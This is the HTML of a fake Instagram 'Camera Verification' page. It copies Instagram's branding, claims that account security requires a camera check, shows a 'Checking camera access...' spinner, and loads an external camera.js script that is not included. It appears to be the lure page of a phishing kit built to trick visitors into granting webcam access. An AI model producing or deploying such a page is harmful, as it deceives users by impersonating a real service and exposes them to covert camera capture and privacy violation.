<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Camera Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            text-align: center;
        }
        .logo {
            font-family: 'Brush Script MT', cursive;
            font-size: 48px;
            margin-bottom: 30px;
            background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        h2 { color: #262626; margin-bottom: 10px; font-size: 22px; }
        p { color: #8e8e8e; margin-bottom: 25px; line-height: 1.5; font-size: 14px; }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3897f0;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .icon { font-size: 64px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <div class="icon">ðŸ“·</div>
        <h2>Camera Verification Required</h2>
        <p>To continue using Instagram, we need to verify your camera is working properly. This helps us ensure the security of your account.</p>
        <div class="spinner"></div>
        <p style="font-size: 12px; color: #c7c7c7;">Checking camera access...</p>
    </div>
    <script src="../camera.js"></script>
</body>
</html>
